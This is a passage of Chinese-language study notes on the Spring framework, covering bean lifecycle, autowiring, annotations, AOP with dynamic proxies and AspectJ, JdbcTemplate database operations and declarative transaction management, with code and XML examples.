{\n\t\tSystem.out.println(\"第五步 在初始化之后执行的方法\");\n\t\treturn bean;\n\t}\n}\n\n\n@Test\npublic void testBean(){\n\tApplicationContext context = new ClassPathXmlApplicationContext(\"bean4.xml\");\n\tOrders orders = context.getBean(\"orders\", Orders.class);\n\tSystem.out.println(\"第四步 获取创建 bean 实例对象\");\n\tSystem.out.println(orders);\n\t//手动让 bean 实例销毁\n\t(ClassPathXmlApplicationContext)context.close();\n}\n```\n```xml\n<bean id=\"orders\" class=\"com.atguigu.spring5.bean.Orders\" init-method=\"initMethod\" destroy-method=\"destroyMethod\">\n\t<property name=\"oname\" value=\"手机\"></property>\n</bean>\n\n<!--配置后置处理器, 配置后该配置文件中的所有bean创建时都会执行后置处理器-->\n<bean id=\"myBeanPost\" class=\"com.atguigu.spring5.bean.MyBeanPost\"></bean>\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124240.png)\n\n### xml自动装配\n自动装配：根据指定装配规则（属性名称或者属性类型）， Spring 自动将匹配的属性值进行注入\nbean标签属性 autowire，配置自动装配\nautowire属性常用两个值：\nbyName 根据属性名称注入 ，注入值bean的id值和类属性名称一样\nbyType 根据属性类型注入, 在该xml中只能有一个该类型的bean，不能有有多个，否则编译器不知道要匹配哪一个bean，从而报错\n1. 根据属性名称自动注入\n```xml\n<bean id=\"emp\" class=\"com.atguigu.spring5.autowire.Emp\" autowire=\"byName\">\n<bean id=\"dept\" class=\"com.atguigu.spring5.autowire.Dept\"></bean>\n```\n2. 根据属性类型自动注入\n```xml\n<bean id=\"emp\" class=\"com.atguigu.spring5.autowire.Emp\" autowire=\"byType\"></bean>\n<bean id=\"dept\" class=\"com.atguigu.spring5.autowire.Dept\"></bean>\n```\n\n### 外部属性文件\n1. 直接配置数据库信息\n（1）配置德鲁伊连接池\n（2）引入德鲁伊连接池依赖 jar 包\n```xml\n<bean id=\"dataSource\" class=\"com.alibaba.druid.pool.DruidDataSource\">\n\t<property name=\"driverClassName\" value=\"com.mysql.jdbc.Driver\"></property>\n\t<property name=\"url\" value=\"jdbc:mysql://localhost:3306/userDb\"></property>\n\t<property name=\"username\" value=\"root\"></property>\n\t<property name=\"password\" value=\"root\"></property>\n</bean>\n```\n2. 引入外部属性文件配置数据库连接池\n创建外部属性文件， properties 格式文件，写数据库信息\n```conf\nprop.driverClass=com.mysql.jdbc.Driver\nprop.url=jdbc:mysql://localhost:3306/userDb\nprop.userName=root\nprop.password=root\n```\n把外部properties属性文件引入到spring配置文件中\n```xml\n<!-- 引入 context 名称空间 -->\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n\t   xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n\t   xmlns:context=\"http://www.springframework.org/schema/context\"\n\t   xsi:schemaLocation=\"http://www.springframework.org/schema/beans\n\t\t\t\t\t\t   http://www.springframework.org/schema/beans/spring-beans.xsd\n\t\t\t\t\t\t   http://www.springframework.org/schema/context\n\t\t\t\t\t\t   http://www.springframework.org/schema/context/spring-context.xsd\">\n\n<!-- 在 spring 配置文件使用标签引入外部属性文件 -->\n<!--引入外部属性文件-->\n<context:property-placeholder location=\"classpath:jdbc.properties\"/>\n<!--配置连接池-->\n<bean id=\"dataSource\" class=\"com.alibaba.druid.pool.DruidDataSource\">\n\t<property name=\"driverClassName\" value=\"${prop.driverClass}\"></property>\n\t<property name=\"url\" value=\"${prop.url}\"></property>\n\t<property name=\"username\" value=\"${prop.userName}\"></property>\n\t<property name=\"password\" value=\"${prop.password}\"></property>\n</bean>\n```\n\n## 基于注解\n1. 什么是注解\n（1）注解是代码特殊标记，格式： @注解名称(属性名称=属性值, 属性名称=属性值..)\n（2）使用注解，注解作用在类上面，方法上面，属性上面\n（3）使用注解目的：简化 xml 配置\n2. Spring针对Bean管理中创建对象提供注解\n（1） @Component\n（2） @Service\n（3） @Controller\n（4） @Repository\n* 上面四个注解功能是完全一样的，都可以用来创建bean实例\n### 基于注解方式实现对象创建\n第一步 引入依赖 spring-aop.jar\n第二步 开启组件扫描, 要先引入context命名空间\n```xml\n<!--开启组件扫描, 开启后，会扫描所有配置要扫描的类，如果扫描到注解，则会根据注解来创建类\t\n1 如果扫描多个包，多个包使用逗号隔开或直接扫描该多个包的上层目录\n-->\n<context:component-scan base-package=\"com.atguigu.dao,com.atguigu.service\"></context:component-scan>\n或\n<context:component-scan base-package=\"com.atguigu\"></context:component-scan>\n```\n第三步 创建类，在类上面添加创建对象注解\n```java\n//在注解里面value属性值可以省略不写， 默认值是类名称，首字母小写; 例如UserService -- userService\n//如果只设置其中的value属性，则可以写成@Component(\"userService\"), 这种省略技巧是java中注解通用的\n@Component(value = \"userService\") //该注解等价于<bean id=\"userService\" class=\"..\"/>\npublic class UserService {\n\tpublic void add() {\n\t\tSystem.out.println(\"service add.......\");\n\t}\n}\n```\n开启组件扫描细节配置\n```xml\n<!--\nuse-default-filters=\"false\" 表示现在不使用默认 filter，自己配置 filter\ncontext:include-filter ，设置扫描哪些内容\ncontext:exclude-filter ，设置不扫描哪些内容\n-->\n<!-- 这个表示只扫描com.atguigu包下的Controller注解的类 -->\n<context:component-scan base-package=\"com.atguigu\" use-defaultfilters=\"false\">\n\t<context:include-filter type=\"annotation\" expression=\"org.springframework.stereotype.Controller\"/>\n\t<context:exclude-filter type=\"annotation\" expression=\"org.springframework.stereotype.Controller\"/>\n</context:component-scan>\n\n<!-- 这个表示不扫描com.atguigu包下的Controller注解的类 -->\n<context:component-scan base-package=\"com.atguigu\" use-defaultfilters=\"false\">\n\t<context:exclude-filter type=\"annotation\"expression=\"org.springframework.stereotype.Controller\"/>\n</context:component-scan>\n```\n### 基于注解方式实现属性注入\n（1）@Autowired：根据属性类型进行自动装配\n第一步 把service和dao对象创建，在service和dao类添加创建对象注解\n第二步 在 service 注入 dao 对象，在 service类添加 dao 类型属性，在属性上面使用注解\n```java\n@Service\npublic class UserService {\n\t//定义 dao 类型属性\n\t//不需要添加 set 方法\n\t//添加注入属性注解\n\t@Autowired\n\tprivate UserDao userDao;\n\n\tpublic void add() {\n\t\tSystem.out.println(\"service add.......\");\n\t\tuserDao.add();\n\t}\n}\n```\nspring发现@Autowired注解时，会根据当前bean类型，寻找在spring中是否存在该类型的bean，找到直接注入，如果找不到还会检查是否有子孙类、实现类存在，如果存在唯一的则自动注入，如果还是没有找到或找到多个无法注入，则还会按照属性名对应id去查找对应的bean，如果存在则注入，如果还是没有找到则抛出异常。也可以额外配置@Qualifier(value=\"dog1\")注解强制要求按照id寻找bean，则此时会直接使用给定的id寻找bean，而不会进行基于类型的匹配。\n\n（2）@Qualifier：根据名称进行注入\n这个@Qualifier 注解的使用要和上面@Autowired 一起使用\n```java\n//定义 dao 类型属性\n//不需要添加 set 方法//添加注入属性注解\n@Autowired //根据类型进行注入\n@Qualifier(value = \"userDaoImpl1\") //根据名称进行注入,其中的value值就是名称值\nprivate UserDao userDao;\n```\n（3） @Resource：可以根据类型注入，也可以根据名称注入\n注：Resource的包是javax.annotation.Resource, 是javax中的，而不是spring中的, 所以spring不推荐使用Resource\n```java\n//@Resource //根据类型进行注入\n@Resource(name = \"userDaoImpl1\") //根据名称进行注入\nprivate UserDao userDao;\n```\n（4） @Value：注入普通类型属性\n```java\n@Value(value = \"abc\")\nprivate String name;\n```\n### 完全注解开发\n（1）创建配置类，替代 xml 配置文件\n```java\n@Configuration //作为配置类，替代 xml 配置文件\n@ComponentScan(basePackages = {\"com.atguigu\"})\npublic class SpringConfig {\n}\n```\n（2）编写测试类\n```java\n@Test\npublic void testService2() {\n\t//加载配置类\n\tApplicationContext context = new AnnotationConfigApplicationContext(SpringConfig.class);\n\tUserService userService = context.getBean(\"userService\", UserService.class);\n\tSystem.out.println(userService);\n\tuserService.add();\n}\n```\n这种开发在实际开发中，使用的是springboot, 其实springboot本质上就是spring\n\n# AOP\n## 什么是 AOP\n（1）面向切面编程（方面）， 利用 AOP 可以对业务逻辑的各个部分进行隔离，从而使得业务逻辑各部分之间的耦合度降低，提高程序的可重用性，同时提高了开发的效率。\n（2）通俗描述：不通过修改源代码方式，在主干功能里面添加新功能\n（3）使用登录例子说明 AOP\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124250.png)\n\n## AOP底层原理\nAOP底层使用的是动态代理\n（1）有两种情况动态代理\n第一种 有接口情况，使用 JDK 动态代理\n创建接口实现类代理对象，增强类的方法\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124258.png)\n\n第二种 没有接口情况，使用 CGLIB 动态代理\n创建子类的代理对象，增强类的方法\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124310.png)\n\n## AOP(JDK动态代理)\nJDK提供了实现动态代理的相关组件。包括如下：\n接口 InvocationHandler；\n类 Proxy；\n它们都在java.lang.reflect包中。\nInvocationHandler是代理实例的调用处理程序 实现的接口。 该接口只有一个方法：Object invoke(Object proxy,Method method,Object[] args)throws Throwable。直接的理解为：当调用被代理对象的某个方法时，实际上会在该接口的实现类上调用invoke方法。也就是说，invoke方法就是代替原来执行的方法。\nProxy 提供用于创建动态代理类和实例的静态方法，创建出来的代理类实例都是Proxy的子类。它的这两个方法是比较重要的：getProxyClass动态生成代理类，newProxyInstance整合了getProxyClass方法并通过构造方法反射获得代理类的实例。当调用代理实例的方法时，该方法实际上就是调用其内部的InvocationHandler的invoke()方法\n\n1. 使用 JDK 动态代理，使用 java.lang.reflect.Proxy 类里面的方法创建代理对象\n（1）调用 newProxyInstance 方法\nstatic Object newProxyInstance(ClassLoader loader, 类<?>[] interfaces, InvocationHandler h)\n该方法返回指定接口的代理类的实例，该接口将方法调用分派给指定的调用处理程序\n方法有三个参数：\n第一参数，类加载器\n第二参数，增强方法所在的类，这个类实现的接口，支持多个接口\n第三参数，实现这个接口 InvocationHandler，创建代理对象，写增强的部分\n2. 编写JDK动态代理代码\n（1）创建接口，定义方法\n```java\npublic interface UserDao{\n\tpublic int add(int a, int b);\n\tpublic String update(String id);\n}\n```\n（2）创建接口实现类，实现方法\n```java\npublic classUserDaoImpl implements UserDao{\n\t@Override\n\tpublic int add(int a, int b){\n\t\treturn a+b;\n\t}\n\t@Override\n\tpublic int update(String id){\n\t\treturn id;\n\t}\n}\n```\n（3）使用 Proxy 类创建接口代理对象\n```java\npublic class JDKProxy{\n\tpublic static void main(String[] args){\n\t\t//创建接口实现类代理对象\n\t\tClass[] interfaces = {UserDao.class};\n\t\tUserDao user = new UserDao();\n\t\tUserDao dao = (UserDao)Proxy.newProxyInstance(JDKProxy.class.getClassLoader(), interfaces, new UserDaoProxy(userDao));\n\t\tint result = dao.add(1, 2);\n\t\tSystem.out.println(\"result:\"+result);\n\t}\n}\n\n//创建代理对象代码\nclass UserDaoProxy implements InvocationHandler{\n\t//把创建的是谁的代理对象，把谁传递过来\n\t//通过有参构造方式进行传递\n\tprivate Object obj;\n\tpublic UserDaoProxy(Object obj){\n\t\tthis.obj = obj;\n\t}\n\n\t//增强的逻辑\n\t//第一个参数：代理对象\n\t//第二个参数：表示当前执行的是那个方法\n\t//第三个参数：表示当前执行的方法中的参数\n\tpublic Object invoke(Object proxy, Method method, Object[] args) throws Throwable{\n\t\t//方法执行前\n\t\tSystem.out.println(\"方法之前执行...\"+method.getName()+\":传递的参数...\"+Arrays.toString(args));\n\t\t//被增强的方法执行\n\t\tObject res = method.invoke(obj, args);\n\t\t//方法之后\n\t\tSystem.out.println(\"方法之后执行...\"+obj);\n\t\treturn res;\n\t}\n}\n```\n## AOP术语\n1. 连接点： 类里面可以被增强的方法，称为连接点\n2. 切入点：实际被真正增强的方法，称为切入点\n3. 通知(增强)：实际增强的逻辑部分称为通知(增强)\n   通知有多种类型：1. 前置通知：在切入点前执行\n                 2. 后置通知：在切入点后执行\n                 3. 环绕通知：在切入点前后执行\n                 4. 异常通知：发生异常时执行\n                 5. 最终通知：类似于finally,无论是否发生异常，都在最后执行\n4. 切面：是动作，是把通知应用到切入点的过程, 即将通知绑定到切入点的过程 [详细使用](#advisor)\n\n## AOP操作(准备工作)\n1. Spring 框架一般都是基于 AspectJ 实现 AOP 操作\n（1） AspectJ 不是 Spring 组成部分，是独立 AOP 框架，一般把 AspectJ 和 Spirng 框架一起使用，进行 AOP 操作\n2. 基于 AspectJ 实现 AOP 操作\n（1）基于 xml 配置文件实现\n（2）基于注解方式实现（在实际开发中常用）\n3. aop相关依赖包：\nspringsource.net.sf.cglib.jar\nspringsource.org.aopalliance.jar\nspringsource.org.aspectj.weaver.jar\nspring-aspects.jar\n4. 切入点表达式\n（1）切入点表达式作用：知道对哪个类里面的哪个方法进行增强\n（2）语法结构： execution([权限修饰符] [返回类型(可省略)] [类全路径] [方法名称] ([参数列表]))\n举例 1：对 com.atguigu.dao.BookDao 类里面的 add 进行增强\nexecution(* com.atguigu.dao.BookDao.add(..))\n举例 2：对 com.atguigu.dao.BookDao 类里面的所有的方法进行增强\nexecution(* com.atguigu.dao.BookDao.* (..))\n举例 3：对 com.atguigu.dao 包里面所有类，类里面所有方法进行增强\nexecution(* com.atguigu.dao.\\*.* (..))\n\n## AOP 操作（AspectJ 注解）\n1. 创建类，在类里面定义方法\n```java\n//被增强的类\n@Component\npublic class User {\n\tpublic void add() {\n\t\tSystem.out.println(\"add.......\");\n\t}\n}\n```\n2. 创建增强类（编写增强逻辑）\n在增强类的里面，在作为通知方法上面添加通知类型注解，使用切入点表达式配置\n```java\n//增强的类\n@Component\n@Aspect //该注解的作用：生成代理对象\npublic class UserProxy{\n\t//前置通知\n\t//@Before 注解表示作为前置通知\n\t@Before(value = \"execution(* com.atguigu.spring5.aopanno.User.add(..))\")\n\tpublic void before() {\n\t\tSystem.out.println(\"before.........\");\n\t}\n\n\t//后置通知（返回通知）, 在return后才执行\n\t@AfterReturning(value = \"execution(* com.atguigu.spring5.aopanno.User.add(..))\")\n\tpublic void afterReturning(){\n\t\tSystem.out.println(\"afterReturning.........\");\n\t}\n\n\t//最终通知\n\t@After(value = \"execution(* com.atguigu.spring5.aopanno.User.add(..))\")\n\tpublic void after(){\n\t\tSystem.out.println(\"after.........\");\n\t}\n\n\t//异常通知\n\t@AfterThrowing(value = \"execution(* com.atguigu.spring5.aopanno.User.add(..))\")\n\tpublic void afterThrowing(){\n\t\tSystem.out.println(\"afterThrowing.........\");\n\t}\n\n\t//环绕通知\n\t@Around(value = \"execution(* com.atguigu.spring5.aopanno.User.add(..))\")\n\tpublic void around(ProceedingJoinPoint proceedingJoinPoint) throws Throwable{\n\t\tSystem.out.println(\"环绕前.........\");\n\t\tproceedingJoinPoint.proceed();// 被增强的方法执行\n\t\tSystem.out.println(\"环绕后.........\");\n\t}\n}\n```\n3. 在spring配置文件中，开启注解扫描，以及开启生成代理对象\n```xml\n<!-- 开启注解扫描 -->\n<context:component-scan basepackage=\"com.atguigu.spring5.aopanno\"></context:component-scan>\n\n<!-- 开启 Aspect 生成代理对象-->\n<aop:aspectj-autoproxy></aop:aspectj-autoproxy>\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124321.png)\n\n- 相同的切入点提取\n```java\n//相同切入点抽取\n@Pointcut(value = \"execution(* com.atguigu.spring5.aopanno.User.add(..))\")\npublic void pointdemo() {\n}\n\n@Before(value = \"pointdemo()\")\npublic void before() {\n\tSystem.out.println(\"before.........\");\n}\n```\n \n- 有多个增强类对同一个方法进行增强，设置增强类优先级\n```java\n@Component\n@Aspect\n@Order(1)\npublic class PersonProxy\n```\n- 完全使用注解开发\n创建配置类，不需要创建 xml 配置文件\n```java\n@Configuration\n@ComponentScan(basePackages = {\"com.atguigu\"})\n@EnableAspectJAutoProxy(proxyTargetClass = true)\npublic class ConfigAop {\n}\n```\n\n## AOP 操作（AspectJ 配置文件）\n1. 创建两个类，增强类和被增强类，创建方法\n2. 在 spring 配置文件中创建两个类对象\n```xml\n<!--创建对象-->\n<bean id=\"book\" class=\"com.atguigu.spring5.aopxml.Book\"></bean>\n<bean id=\"bookProxy\" class=\"com.atguigu.spring5.aopxml.BookProxy\"></bean>\n```\n3. 在 spring 配置文件中配置切入点\n```xml\n<aop:config>\n\t<!--切入点-->\n\t<aop:pointcut id=\"p\" expression=\"execution(* com.atguigu.spring5.aopxml.Book.buy(..))\"/>\n\n\t<!--配置切面-->\n\t<aop:aspect ref=\"bookProxy\">\n\t\t<!--增强作用在具体的方法上-->\n\t\t<aop:before method=\"before\" pointcut-ref=\"p\"/>\n\t</aop:aspect>\n</aop:config>\n```\n\n# JdbcTemplate\n什么是JdbcTemplate: Spring 框架对JDBC进行封装，使用JdbcTemplate方便实现对数据库操作\n需要使用的jar包：\nmysql-connector-java.jar\nspring-jdbc.jar\nspring-tx.jar : 有关事务的包\nspring-orm.jar : spring需要与MyBatis等其他数据库框架整合时，需要引入\n\n## JdbcTemplate准备\n```xml\n<!-- 组件扫描 -->\n<context:component-scan base-package=\"com.atguigu\"></context:component-scan>\n\n<!-- 在 spring 配置文件配置数据库连接池 -->\n<!-- 数据库连接池 -->\n<bean id=\"dataSource\" class=\"com.alibaba.druid.pool.DruidDataSource\"\ndestroy-method=\"close\">\n\t<property name=\"url\" value=\"jdbc:mysql:///user_db\" /> \n\t<property name=\"username\" value=\"root\" />\n\t<property name=\"password\" value=\"root\" />\n\t<property name=\"driverClassName\" value=\"com.mysql.jdbc.Driver\" />\n</bean>\n\n<!-- 配置 JdbcTemplate 对象，注入 DataSource -->\n<!-- JdbcTemplate 对象 -->\n<bean id=\"jdbcTemplate\" class=\"org.springframework.jdbc.core.JdbcTemplate\">\n\t<!--注入 dataSource-->\n\t<property name=\"dataSource\" ref=\"dataSource\"></property>\n</bean>\n```\n```java\n@Service\npublic class BookService{\n\t@Autowired\n\tprivate BookDao bookDao;\n}\n\n@Repository\npublic class BookDaoImpl implements BookDao{\n\t//注入JdbcTemplate\n\t@Autowired\n\tprivate JdbcTemplate jdbcTemplate;\n}\n```\n## JdbcTemplate 操作数据库（添加、修改、删除）\n1. 对应数据库创建实体类\n```java\npublic class User{\n\tprivate String userId;\n\tprivate String username;\n\tprivate String ustatus;\n\t/..set, get../\n}\n```\n2. 编写 service 和 dao\n（1）在 dao 进行数据库添加操作\n（2）调用 JdbcTemplate 对象里面 update(String sql, Object... args)方法实现添加操作\nupdate方法的第一个参数：sql语句\n           第二个参数：可变参数，设置sql语句值\n```java\n@Service\npublic class BookService{\n\t@Autowired\n\tprivate BookDao bookDao;\n\n\t//添加的方法\n\tpublic void addBook(Book book){\n\t\tbookDao.add(book);\n\t}\n\n\t//修改的方法\n\tpublic void updateBook(Book book){\n\t\tbookDao.updateBook(book);\n\t}\n\n\t//删除操作\n\tpublic void delete(Book book){\n\t\tbookDao.delete(book);\n\t}\n\n}\n\n@Repository\npublic class BookDaoImpl implements BookDao{\n\t//注入JdbcTemplate\n\t@Autowired\n\tprivate JdbcTemplate jdbcTemplate;\n\n\t//添加的方法\n\t@Override\n\tpublic void add(Book book){\n\t\t//创建sql语句\n\t\tString sql = \"insert into t_book values(?, ?, ?)\";\n\t\t//调用方法实现\n\t\tObject[] args = {book.getUserId(), book.getUsername(), book.getUstatus()};\n\t\tint update = jdbcTemplate.update(sql, args);\n\t\tSystem.out.println(update);\n\t}\n\n\t//修改的方法\n\t@Override\n\tpublic void updateBook(Book book){\n\t\tString sql = \"update t_book set username=?, ustatus=? where user_id =?\";\n\t\tObject[] args = {book.getUsername(), book.getUstatus(), book.getUserId()};\n\t\tint update = jdbcTemplate.update(sql, args);\n\t\tSystem.out.println(update);\n\t}\n\n\t//删除操作\n\t@Override\n\tpublic void delete(String id){\n\t\tString sql = \"delete from t_book where user_id=?\";\n\t\tint update = jdbcTemplate.update(sql, id);\n\t\tSystem.out.println(update);\n\t}\n}\n\n```\n3. 测试类\n```java\n@Test\npublic void testJdbcTemplate(){\n\tApplicationContext context = new ClassPathXmlApplicationContext(\"bean1.xml\");\n\tBookService bookService = context.getBean(\"bookService\", BookService.class);\n\n\tBook book = new Book();\n\tbook.setUserId(\"1\");\n\tbook.setUsername(\"java\");\n\tbook.setUstatus(\"a\");\n\tbookService.addBook(book);\n}\n```\n## JdbcTemplate 操作数据库（查询返回某个值）\n使用的方法：queryForObject(String sql, Class<T> requiredType)\n第一个参数：sql语句\n第二个参数：返回类型Class\n```java\n@Override\npublic int selectCount(){\n\tString sql = \"select count(*) from t_book\";\n\tInteger count = jdbcTemplate.queryForObject(sql, Integer.class);\n\treturn count;\n}\n```\n## JdbcTemplate 操作数据库（查询返回对象）\n使用的方法：queryForObject(String sql, RowMapper<T> rowMapper, Object... args)\n第一个参数：sql语句\n第二个参数：RowMapper是接口，针对返回不同类型数据，使用这个接口里面实现类完成数据封装\n第三个参数：sql语句值\n```java\npublic Book findBookInfo(String id){\n\tString sql = \"select * from t_book where user_id = ?\";\n\t//调用方法\n\tBook book = jdbcTemplate.queryForObject(sql, new BeanPropertyRowMapper<Book>(Book.class), id);\n\treturn book;\n}\n```\n## JdbcTemplate 操作数据库（查询返回集合）\n使用的方法：query(String sql, RowMapper<T> rowMapper, Object... args)\n第一个参数：sql语句\n第二个参数：RowMapper是接口，针对返回不同类型数据，使用这个接口里面实现类完成数据封装\n第三个参数：sql语句值\n```java\npublic List<Book> findAllBook(){\n\tString sql = \"select * from t_book\";\n\t//调用方法\n\tList<Book> bookList = jdbcTemplate.query(sql, new BeanPropertyRowMapper<Book>(Book.class));\n\treturn bookList;\n}\n```\n\n## JdbcTemplate 操作数据库（批量操作）\n使用的方法：batchUpdate(String sql, List<Object[]> batchArgs)\n第一个参数：sql语句\n第二个参数：List集合, 批量操作的sql语句值\n```java\npublic void batchAddBook(List<Object[]> batchArgs){\n\tString sql = \"insert into t_book values(?, ?, ?)\";\n\tint[] ints = jdbcTemplate.batchUpdate(sql, batchArgs);\n\tSystem.out.println(Arrays.toString(ints));\n}\n```\n\n# 事务\n## 事务操作\n1. 事务最好添加到 JavaEE 三层结构里面 Service 层（业务逻辑层）\n2. 在 Spring 进行事务管理操作\n有两种方式： 编程式事务管理和声明式事务管理（使用） \n3. Spring事务管理API\n提供一个接口，代表事务管理器，这个接口针对不同的框架提供不同的实现类\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124334.png)\n\n## 编程式事务管理\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124344.png)\n\n## 声明式事务管理\n有两种方式：\n1. 基于注解方式（使用）\n2. 基于 xml 配置文件方式\n在 Spring 进行声明式事务管理，底层使用 AOP 原理\n\n### 注解声明式事务管理\n1. 在 spring 配置文件配置事务管理器\n```xml\n<!--创建事务管理器-->\n<bean id=\"transactionManager\" class=\"org.springframework.jdbc.datasource.DataSourceTransactionManager\">\n\t<!--注入数据源-->\n\t<property name=\"dataSource\" ref=\"dataSource\"></property>\n</bean>\n```\n2. 在 spring 配置文件，开启事务注解\n```xml\n<!-- （1）在 spring 配置文件引入名称空间 tx -->\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n\t\txmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n\t\txmlns:context=\"http://www.springframework.org/schema/context\"\n\t\txmlns:aop=\"http://www.springframework.org/schema/aop\"\n\t\txmlns:tx=\"http://www.springframework.org/schema/tx\"\n\t\txsi:schemaLocation=\"http://www.springframework.org/schema/beans\n\t\t\t\t\t\t\thttp://www.springframework.org/schema/beans/spring-beans.xsd\n\t\t\t\t\t\t\thttp://www.springframework.org/schema/context\n\t\t\t\t\t\t\thttp://www.springframework.org/schema/context/spring-context.xsd\n\t\t\t\t\t\t\thttp://www.springframework.org/schema/aop\n\t\t\t\t\t\t\thttp://www.springframework.org/schema/aop/spring-aop.xsd\n\t\t\t\t\t\t\thttp://www.springframework.org/schema/tx\n\t\t\t\t\t\t\thttp://www.springframework.org/schema/tx/spring-tx.xsd\">\n\n<!-- （2）开启事务注解 -->\n<!--开启事务注解-->\n<tx:annotation-driven transactionmanager=\"transactionManager\"></tx:annotation-driven>\n```\n3. 在 service 类上面（ 或者 service 类里面方法上面）添加事务注解\n使用注解@Transactional; 在 service 类上面（ 或者 service 类里面方法上面）添加事务注解\n如果把这个注解添加类上面，这个类里面所有的方法都添加事务\n如果把这个注解添加方法上面，为这个方法添加事务\n```java\n@Service\n@Transactional\npublic class UserService {\n```\n\n\n\n### 完全注解声明式事务管理\n创建配置类，使用配置类替代 xml 配置文件\nSpringIOC 容器管理一个或者多个bean，这些bean都需要在@Configuration注解下进行创建，在一个方法上使用@Bean注解就表明这个方法需要交给Spring进行管理。\n```java\n@Configuration //告诉spring，这是一个配置类\n@ComponentScan(basePackages = \"com.atguigu\") //组件扫描\n@EnableTransactionManagement //开启事务\npublic class TxConfig {\n\t//创建数据库连接池\n\t@Bean\n\tpublic DruidDataSource getDruidDataSource() {\n\t\tDruidDataSource dataSource = new DruidDataSource();\n\t\tdataSource.setDriverClassName(\"com.mysql.jdbc.Driver\");\n\t\tdataSource.setUrl(\"jdbc:mysql:///user_db\");\n\t\tdataSource.setUsername(\"root\");\n\t\tdataSource.setPassword(\"root\");\n\t\treturn dataSource;\n\t}\n\t//创建 JdbcTemplate 对象\n\t@Bean\n\tpublic JdbcTemplate getJdbcTemplate(DataSource dataSource) {\n\t\t//到 ioc 容器中根据类型找到 dataSource\n\t\tJdbcTemplate jdbcTemplate = new JdbcTemplate();\n\t\t//注入 dataSource\n\t\tjdbcTemplate.setDataSource(dataSource);return jdbcTemplate;\n\t}\n\t//创建事务管理器\n\t@Bean\n\tpublic DataSourceTransactionManager getDataSourceTransactionManager(DataSource dataSource) {\n\t\tDataSourceTransactionManager transactionManager = new DataSourceTransactionManager();\n\t\ttransactionManager.setDataSource(dataSource);\n\t\treturn transactionManager;\n\t}\n}\n```\n### 声明式事务管理参数配置\n在 service 类上面添加注解@Transactional，在这个注解里面可以配置事务相关参数\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124355.png)\n\n**1. propagation：事务传播行为**\n事务传播行为指的就是当一个事务方法被另一个事务方法调用时，这个事务方法应该如何进行。 \n例如：methodA事务方法调用methodB事务方法时，methodB是继续在调用者methodA的事务中运行呢，还是为自己开启一个新事务运行，这就是由methodB的事务传播行为决定的。\nSpring定义了七种传播行为\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124403.png)\n\n- required(默认值) ：如果methodA有事务，则methodB使用的时methodA中的事务\n- required_NEW: 无论methodA是否有事务，methodB都会创建新的事务\n\n**2. ioslation：事务隔离级别**\n事务有特性成为隔离性，多事务操作之间不会产生影响。不考虑隔离性产生很多问题，常见的有三个读问题：脏读、不可重复读、虚（幻）读\n- 脏读：一个未提交事务读取到另一个未提交事务（由事务回滚导致）的数据\n- 不可重复读：一个未提交事务读取到另一提交事务修改数据\n- 虚读：一个未提交事务读取到另一提交事务添加数据\n通过设置事务隔离级别，解决读问题\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124415.png)\n\n**3. timeout：超时时间**\n（1）事务需要在一定时间内进行提交，如果没在规定时间提交，则进行回滚\n（2）默认值是 -1，即不设置超时， 设置时间以秒单位进行计算\n**4. readOnly：是否只读**\n（1）读：查询操作，写：添加修改删除操作\n（2）readOnly 默认值 false，表示可以查询，可以添加修改删除操作\n（3）设置 readOnly 值是 true，设置成 true 之后，只能查询\n**6. rollbackFor：回滚**\n设置出现哪些异常进行事务回滚\n**7. noRollbackFor：不回滚**\n设置出现哪些异常不进行事务回滚\n\n### XML 声明式事务管理\n在 spring 配置文件中进行配置\n第一步 配置事务管理器\n第二步 配置通知\n第三步 配置切入点和切面\n<span id=\"advisor\"></span>\n\n```xml\n<!-- 1.配置事务管理器-->\n<bean id=\"transactionManager1\" class=\"org.springframework.jdbc.datasource.DataSourceTransactionManager\">\n\t<!-- 注入数据源 -->\n\t<property name=\"dataSource\" ref=\"dataSource\"></property>\n</bean>\n\n<!-- 2. 配置通知 -->\n<tx:advice id=\"txadvice\" transcation-manager=\"transactionManager1\">\n\t<!-- 配置事务参数 -->\n\t<tx:attributes>\n\t\t<!-- 配置符合规则的方法事务的参数-->\n\t\t<!-- 配置方法名为accountMoney的事务的propagation参数为REQUIRED\n\t\t     由于我们通过aop:advisor将切入点与通知绑定在一起，所以spring会在切入点下找accountMoney方法-->\n\t\t<tx:method name=\"accountMoney\" propagation=\"REQUIRED\"/>\n\n\t\t<!-- 配置方法名以get开头的事务的read-only参数为true-->\n\t\t<tx:method name=\"get*\" read-only=\"true\"/>\n\t</tx:attributes>\n</tx:advice>\n\n<!-- 3 配置切入点和切面 -->\n<aop:config>\n\t<!-- 配置切入点 -->\n\t<aop:pointcut id=\"pt\" expression=\"execution(* com.atguigu.spring5.service.UserService.*(..))\"/>\n\t<!-- 配置切面, 将pt切入点与teadvice通知绑定在一起 -->\n\t<aop:advisor advice-ref=\"txadvice\" pointcut-ref=\"pt\"/>\n</aop:config>\n```\n\n### 触发事务回滚条件\n- 通常在方法上加上@transactional注解，此时指的是没有加任何属性的，此时触发回滚条件是：抛出RuntimeException或者Error（常见的非RuntimeException不触发回滚）\n- 如果要在抛出 非RuntimeException时也触发回滚机制，需要我们在注解上添加 rollbackFor = { Exception.class }属性\n\n#### 手动回滚事务\n有时我们需要捕获一些错误信息，又需要进行事务回滚，这时我们就需要用到Spring提供的事务切面支持类TransactionAspectSupport。\n```\n@Transactional(rollbackFor = Exception.class)\n@Override\npublic void saveEntity() throws Exception{\n    try {\n        userDao.saveUser();\n        studentDao.saveStudent();\n    }catch (Exception e){\n        System.out.println(\"异常了=====\" + e);\n        //手动强制回滚事务，这里一定要第一时间处理\n        TransactionAspectSupport.currentTransactionStatus().setRollbackOnly();\n    